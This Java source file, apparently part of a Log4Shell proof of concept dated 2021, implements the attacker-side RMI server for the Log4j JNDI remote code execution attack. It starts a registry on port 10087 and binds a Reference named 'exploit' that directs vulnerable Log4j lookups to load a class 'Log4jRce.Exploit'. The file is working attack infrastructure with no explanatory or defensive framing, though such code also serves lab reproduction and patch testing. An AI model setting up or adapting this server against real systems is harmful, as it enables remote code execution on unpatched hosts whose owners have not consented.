package Log4jRce;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;

/**
 * Created by hfc on 2021/12/13.
 */
public class RmiServer extends UnicastRemoteObject {

    protected RmiServer() throws RemoteException {
    }

    public static void main(String[] args) throws Exception {

        Registry registry = LocateRegistry.createRegistry(10087);
//        registry.bind("server", new RmiServer());

        Reference reference = new Reference("Log4jRce.Exploit",
                "Log4jRce.Exploit", null);
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
        registry.bind("exploit", wrapper);

        System.out.println("--- rmi server started ---");
        Thread.currentThread().join();
    }
}
